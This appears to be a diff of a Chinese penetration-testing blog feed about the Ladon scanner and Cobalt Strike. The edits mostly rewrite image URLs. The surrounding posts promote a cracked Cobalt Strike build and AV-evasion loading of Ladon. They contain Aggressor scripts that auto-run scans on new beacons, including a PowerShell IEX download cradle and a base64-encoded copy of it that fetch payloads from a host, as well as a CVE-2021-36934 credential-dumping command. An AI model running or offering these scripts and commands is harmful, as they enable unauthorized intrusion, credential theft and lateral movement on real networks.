-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_10.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_10.PNG"></p>
 <h3 id="本地加载免杀"><a href="#本地加载免杀" class="headerlink" title="本地加载免杀"></a>本地加载免杀</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_11.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_11.PNG"></p>
 <p>还有另外一个方法，就是自行免杀LadonGo，开源支持全平台。</p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>大家也可以按照该方法，免杀其它.net写的工具，像Ladon这样一百多个功能的程序都能免杀，相信大部份.net写的程序，应该都能免杀，除非是被Defender重点针对的工具，如mimikat。</p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Ladon免杀/.NET免杀/Exe2Ps1/Ps12Exe<br><a href="https://k8gege.org/Ladon/Exe2Powershell.html">https://k8gege.org/Ladon/Exe2Powershell.html</a><br>Ladon九种PowerShell命令混淆加密免杀方法<br><a href="https://k8gege.org/Ladon/PowershellEncode.html">https://k8gege.org/Ladon/PowershellEncode.html</a></p>
@@ -4092,7 +4092,7 @@ window.location.href="https://k8gege.org/Ladon/cs911.html";
   <entry>
     <title>〖工具〗Cobalt Strike 3.12 3.13 4.3 4.4 K8破解版</title>
     <url>/p/cs.html</url>
-    <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44.PNG"></p>
+    <content><![CDATA[<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44.PNG"></p>
 <h3 id="Cobalt-Strike-K8破解版"><a href="#Cobalt-Strike-K8破解版" class="headerlink" title="Cobalt Strike K8破解版"></a>Cobalt Strike K8破解版</h3><p>Cobalt Strike 4.4<br>Cobalt Strike 4.3<br>Cobalt Strike 3.13<br>Cobalt Strike 3.12</p>
 <p>1.内置Windows版TeamServer.exe启动器<br>2.内置巨龙拉冬Ladon7.2 巨龙拉冬插件</p>
 <p>K8版默认集成Ladon7.2,可自行替换9.1版<br>修改版CS生成payload的后门暗桩已删除<br>证书均为CS默认，介意可以自行修改证书</p>
@@ -4116,25 +4116,25 @@ window.location.href="https://k8gege.org/Ladon/cs911.html";
 <h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码审计、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。9.1版本内置125个功能模块,外部模块20个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，多协议探测操作系统版本信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码审计17种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar、网络摄像头、路由器等，横向移动远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别86种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
 <h4 id="无图无真相"><a href="#无图无真相" class="headerlink" title="无图无真相"></a>无图无真相</h4><p>好了废话不多说上图，让我们看看Cobalt Strike 4.4巨龙拉冬插件功能</p>
 <p>如果你熟悉Ladon命令的可以直接在Beacon上执行相应命令即可，如使用“Ladon GetID”命令查看目标机器名、机器ID、CPUID、硬盘ID、MAC地址等信息，主要用于区分一些大内网同名机器，或其它用途。若是你不熟悉可以使用右键菜单，为了方便新人或不太熟的人</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44.PNG"></p>
 <p>如果不熟悉Ladon命令用法，也可以右键菜单，使用非常方便，只需选择模块填写目标参数如(IP、URL、域名、主机名、CIDR格式IP等)，即可加载对应模块扫描或探测你想获取的信息，如探测C段存在MS17010漏洞的机器。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_9.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_9.PNG"></p>
 <p>内网外网网络资产探测</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_2.PNG"></p>
 <p>操作系统信息探测</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_3.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_3.PNG"></p>
 <p>漏洞检测</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_4.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_4.PNG"></p>
 <p>网络密码审计</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_5.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_5.PNG"></p>
 <p>本机信息收集</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_6.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_6.PNG"></p>
 <p>横向移动、远程执行</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_7.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_7.PNG"></p>
 <p>权限提升、本地提权</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_8.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_8.PNG"></p>
 <p>这么强大的插件如何获取呢？</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/csget.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/csget.PNG"></p>
 <p>原文：<a href="https://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA</a></p>
 <h3 id="CS下载"><a href="#CS下载" class="headerlink" title="CS下载"></a>CS下载</h3><p>CS 3.12 3.13 4.3 4.4 K8破解版<br>000为原始试用版本(部分未找到，大家可以提供给我更新)<br><a href="https://github.com/k8gege/Aggressor/releases/tag/cs" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor/releases/tag/cs</a></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo 3.8: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>9.1版本：K8小密圈</p>
@@ -4149,7 +4149,7 @@ window.location.href="https://k8gege.org/Ladon/cs911.html";
   <entry>
     <title>〖工具〗巨龙拉冬：让你的Cobalt Strike变成超级武器</title>
     <url>/p/ladon_cs.html</url>
-    <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/Ladon/Dragon.jpg"></p>
+    <content><![CDATA[<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/Dragon.jpg"></p>
 <p>Cobalt Strike巨龙拉冬插件9.0发布，让大家久等了，就当是程序员节礼物。原计划是Ladon8.0的时候出的，当时也实现了部份功能，但因为放在虚拟机里，可能误删了没备份，也因为各种事懒得重写，拖着拖着Ladon已出到9.0了，也想国庆写，但国庆又想上王者，于是又拖到最近两天才重写插件，CS右键已实现90%的功能部分功能请先在Beacon命令行使用。巨龙拉冬中文插件和Ladon英文插件的区别是右键菜单功能更全，英文的菜单让很多不熟的人，误以为Ladon并没让CS加强多少功能，而有些知道Ladon功能多的人，也误以为Ladon有很多乱七八槽的功能，最主要是文档不看，问我有没什么功能？如他想查询内网C段存在哪些WEB资产(网站、标题、Banner)等信息，问有没什么工具可以收集啊，然后他gitub找了一圈，哎呀这个工具是PYTHON的这个是GO的体积太大了，就一个功能还需要上传过去，不方便啊，最后来一句Ladon能不能加这个功能图片，我说兄弟能看看Ladon的文档吗？一个WebScan或WhatCMS搞定，用法和你们扫MS17010或OnlinePC一样简单但功能又强大，功能无论是博客文档还是GUI版上的WIKI都可以查看，问我有没有。现在功能又集成到CS插件右键上而且是中文的，希望下次不要再问我类似问题了，你们可以看到从右键菜单看Ladon功能更直观，觉得不乱了，你会发现那些功能都是实战要用的。因为有时候做不同的项目，有些模块可能用不到，时间久了我自己也忘记有这功能，然后去网上找，找着找着发现这功能我几年前写过，或Ladon里有，差点又重复造自己的轮子，所以觉得此中文版除了照顾大部分人，对于我可能也是需要的。总之一句话“Ladon在手，天下我有”，让你的它”Cobalt Strike”变成超级武器吧！不管你信不信，我反正信了。</p>
 <p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
 <script language="javascript" type="text/javascript">
@@ -4185,25 +4185,25 @@ window.location.href="https://k8gege.org/Ladon/ladon_cs.html";
 <h4 id="0x020-其它功能"><a href="#0x020-其它功能" class="headerlink" title="0x020 其它功能"></a>0x020 其它功能</h4><p>网站HTML源码查看</p>
 <h4 id="无图无真相"><a href="#无图无真相" class="headerlink" title="无图无真相"></a>无图无真相</h4><p>好了废话不多说上图，让我们看看Cobalt Strike 4.4巨龙拉冬插件功能</p>
 <p>如果你熟悉Ladon命令的可以直接在Beacon上执行相应命令即可，如使用“Ladon GetID”命令查看目标机器名、机器ID、CPUID、硬盘ID、MAC地址等信息，主要用于区分一些大内网同名机器，或其它用途。若是你不熟悉可以使用右键菜单，为了方便新人或不太熟的人</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44.PNG"></p>
 <p>如果不熟悉Ladon命令用法，也可以右键菜单，使用非常方便，只需选择模块填写目标参数如(IP、URL、域名、主机名、CIDR格式IP等)，即可加载对应模块扫描或探测你想获取的信息，如探测C段存在MS17010漏洞的机器。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_9.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_9.PNG"></p>
 <p>内网外网网络资产探测</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_2.PNG"></p>
 <p>操作系统信息探测</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_3.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_3.PNG"></p>
 <p>漏洞检测</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_4.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_4.PNG"></p>
 <p>网络密码审计</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_5.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_5.PNG"></p>
 <p>本机信息收集</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_6.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_6.PNG"></p>
 <p>横向移动、远程执行</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_7.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_7.PNG"></p>
 <p>权限提升、本地提权</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/cs44_8.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/cs44_8.PNG"></p>
 <p>这么强大的插件如何获取呢？</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/cs44/csget.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/cs44/csget.PNG"></p>
 <p>原文：<a href="https://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA</a></p>
 <h3 id="CS下载"><a href="#CS下载" class="headerlink" title="CS下载"></a>CS下载</h3><p><a href="https://github.com/k8gege/Aggressor/releases/tag/cs" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor/releases/tag/cs</a></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo 3.8: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>9.0版本：K8小密圈</p>
@@ -4238,32 +4238,32 @@ window.location.href="https://k8gege.org/Ladon/auto.html";
 
 <p>测试脚本</p>
 <p>以上代码保存为auto.cna文件，工具栏–Cobalt Strike–Script Mannge–点击Load加载auto.cna</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/auto/cna.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/auto/cna.png"></p>
 <p>加载后，打开beacon会话，发现已自动执行我们预设的命令net user</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/auto/auto.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/auto/auto.png"></p>
 <h3 id="执行Ladon"><a href="#执行Ladon" class="headerlink" title="执行Ladon"></a>执行Ladon</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"MS17010"</span>);</span><br></pre></td></tr></table></figure>
 
 <p>PS:Ladon可自动获取当前机器所有网卡IP，并扫描C段机器是否存在MS17010漏洞，使用其它扫描模块同理，所以实现自动信息获取、漏洞扫描等，有些模块可能需要传相关文件，本文暂不讨论。</p>
 <h3 id="自动渗透脚本"><a href="#自动渗透脚本" class="headerlink" title="自动渗透脚本"></a>自动渗透脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Initial GetInfo</span></span><br><span class="line"><span class="comment">#by K8gege</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"><span class="comment">#println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));</span></span><br><span class="line">blog(<span class="variable">$1</span>,<span class="string">"Auto GetInfo"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"onlinepc"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"ms17010"</span>);</span><br><span class="line"><span class="comment">#bshell($1,"whoami&amp;net user&amp;tasklist");</span></span><br><span class="line"><span class="comment">#$process = exec("whoami");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>重新加载脚本测试，可看到机器上线后，CS联动Ladon探测存活主机等，对于那些在你吃饭休息时间才上线的机器，回来看到它自动收集信息岂不美栽!</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/auto/auto2.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/auto/auto2.png"></p>
 <h3 id="执行复杂命令"><a href="#执行复杂命令" class="headerlink" title="执行复杂命令"></a>执行复杂命令</h3><p>对于Ladon未支持的功能，可能需复杂的多语句命令完成，命令中的双引号以及其它特殊字符CS转义比较麻烦，加上现在XP、2003系统几乎淘汰，主流基本都是WIN7以上系统，所以推荐大家使用PowerShell比较省事。以CS自动更新或转移权限为例，以下是CS的一行代码上线命令</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">""</span>IEX ((new-object net.webclient).downloadstring(<span class="string">'http://192.168.1.8:80/a'</span>))<span class="string">""</span></span><br></pre></td></tr></table></figure>
 
 <p>使用LadonGui–PowerShell的Base64Command将要执行的命令转成base64Command，这样可完美解决CNA脚本解析符号或转义问题。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/auto/b64cmd.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/auto/b64cmd.png"></p>
 <h3 id="CS自动更新脚本"><a href="#CS自动更新脚本" class="headerlink" title="CS自动更新脚本"></a>CS自动更新脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Initial GetInfo</span></span><br><span class="line"><span class="comment">#by K8gege</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"><span class="comment">#println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));</span></span><br><span class="line">blog(<span class="variable">$1</span>,<span class="string">"Auto GetInfo"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line"><span class="comment">#bexecute_assembly!($1, script_resource("Ladon.exe"),"getinfo");</span></span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AOAA6ADgAMAAvAGEAMQAxACcAKQApACIA"</span>);</span><br><span class="line"><span class="comment">#bshell($1,"whoami&amp;net user&amp;tasklist");</span></span><br><span class="line"><span class="comment">#$process = exec("whoami");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>当目标机器上线时，将执行转换好的powershell代码，自动完成权限转移</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/auto/autocs.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/auto/autocs.png"></p>
 <h3 id="Ladon自动化脚本"><a href="#Ladon自动化脚本" class="headerlink" title="Ladon自动化脚本"></a>Ladon自动化脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Initial GetInfo</span></span><br><span class="line"><span class="comment">#by K8gege</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"><span class="comment">#println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));</span></span><br><span class="line">blog(<span class="variable">$1</span>,<span class="string">"Auto GetInfo"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"onlinepc"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"ms17010"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"smbinfo"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"wmiinfo"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"snmpscan"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"webscan"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"getinfo"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"cmdline"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"usblog"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"rdplog"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"getid"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"recent"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"netver"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"allver"</span>);</span><br><span class="line"><span class="comment">#bshell($1,"whoami&amp;net user&amp;tasklist");</span></span><br><span class="line"><span class="comment">#$process = exec("whoami");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>以上为CS联运Ladon收集信息脚本，若需要其它功能，请自行添加</p>
 <h3 id="关于GetInfo"><a href="#关于GetInfo" class="headerlink" title="关于GetInfo"></a>关于GetInfo</h3><p>getinfo模块会自动收集以下信息，所以无需bshell添加一堆命令，当然截图只能截到一部分，有些功能如usblog、.net版本、最近使用文件recent等非cmd命令获取的信息也在该模块里，如截图部分的获取CPUID、硬盘ID等非cmd命令获取，getinfo能获取的信息，并不全是系统自带CMD，有些信息自带的格式错乱，或者获取不到更详细参数。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/auto/getinfo.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/auto/getinfo.png"></p>
 <p>GetInfo2模块比getinfo多了以下功能，因为考虑到在少量机器上wmi执行有问题会导致卡死，所以为了兼容所有C2默认getinfo不获取该wmi相关信息</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/auto/getinfo2.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/auto/getinfo2.png"></p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://k8gege.org/p/648af4b3.html">https://k8gege.org/p/648af4b3.html</a></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo 3.8: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>9.0版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
@@ -4294,19 +4294,19 @@ window.location.href="https://k8gege.org/Ladon/cve-2021-36934.html";
 <h3 id="密码读取"><a href="#密码读取" class="headerlink" title="密码读取"></a>密码读取</h3><p>执行命令</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon CVE-2021-36934</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/win8.1_ok.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2021-36934/win8.1_ok.png"></p>
 <p>成功读取 Win8.1 x64 VPN连接帐号密码、系统用户HASH、DPAPI-KEY</p>
-<h3 id="Coblat-Strike联动"><a href="#Coblat-Strike联动" class="headerlink" title="Coblat Strike联动"></a>Coblat Strike联动</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/cs_ok.png"></p>
+<h3 id="Coblat-Strike联动"><a href="#Coblat-Strike联动" class="headerlink" title="Coblat Strike联动"></a>Coblat Strike联动</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2021-36934/cs_ok.png"></p>
 <p>其它结果</p>
 <p>Win8.1  x64 低权限失败 管理员成功</p>
 <p>win10 1607 低权限失败 管理员成功</p>
 <p>Win10 1903 低权限、管理员均失败</p>
 <p>Win10 1803 低权限、管理员均失败</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/1607_no.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2021-36934/1607_no.png"></p>
 <p>可以看到HiveNightmare在多个系统下就算是管理员权限也无法读取HASH</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/1803_no.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2021-36934/1803_no.png"></p>
 <p>Win10 1607 x64  Ladon成功读取NTLM-HASH、DPAPI</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/1607_ok.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2021-36934/1607_ok.png"></p>
 <p>手头只有这些环境实验，这些版本未在低权限成功，如大家用Ladon9.0在其它Win10版本上测试，低权限成功的，也可以后台将图片发送给我更新。当然就算是同一版本，我测试失败，也不代表你们失败，实战还是直接上，能读出来就是成功，管它37等于28呢？比如说理论上不支持某些版本(默认开启某些设置那种情况)，要是人为修改了不就存在漏洞了，如管理员乱改或做了什么设置，导致默认条件下无漏洞的版本变成了易受攻击的系统，你只是看到版本为XX，就不测试了，可能就错过了，所以我一直强调，实战为王。</p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://k8gege.org/p/648af4b3.html">https://k8gege.org/p/648af4b3.html</a><br><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934</a><br><a href="https://github.com/GossiTheDog/HiveNightmare" target="_blank" rel="noopener">https://github.com/GossiTheDog/HiveNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-36934" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-36934</a></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo 3.8: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>9.0版本：K8小密圈</p>
@@ -4340,13 +4340,13 @@ window.location.href="https://k8gege.org/Ladon/cmddll.html";
 
 <p>复现0day前，测试是必须的，先保证DLL功能正常，才能拿去复现漏洞，不然你不知道是漏洞的DLL注入或DLL加载器没调好，还是DLL本身有问题，DLL启动参数是任意的，意味着不管漏洞注入导出函数是什么，都能加载，所以我们可用于多个已知漏洞或以后新出的0day漏洞测试。</p>
 <h3 id="GUI用法"><a href="#GUI用法" class="headerlink" title="GUI用法"></a>GUI用法</h3><p>由于生成DLL都是本地生成，使用CMD版比较麻烦，所以该功能添加到GUI中。用法打开LadonGUI–CmdDll模块，上文本框填写需要执行的CMD命令，CMD执行有两种方式，一是默认的CMD执行，二是PowerShell Base64加密执行，(勾选Base64Cmd),根据需要点击对应系统位数生成DLL。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_calc.PNG"></p>
-<h4 id="弹计算器演示"><a href="#弹计算器演示" class="headerlink" title="弹计算器演示"></a>弹计算器演示</h4><p>为了方便，可以通过GUI上的TEST按钮测试DLL功能<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_calc.gif"></p>
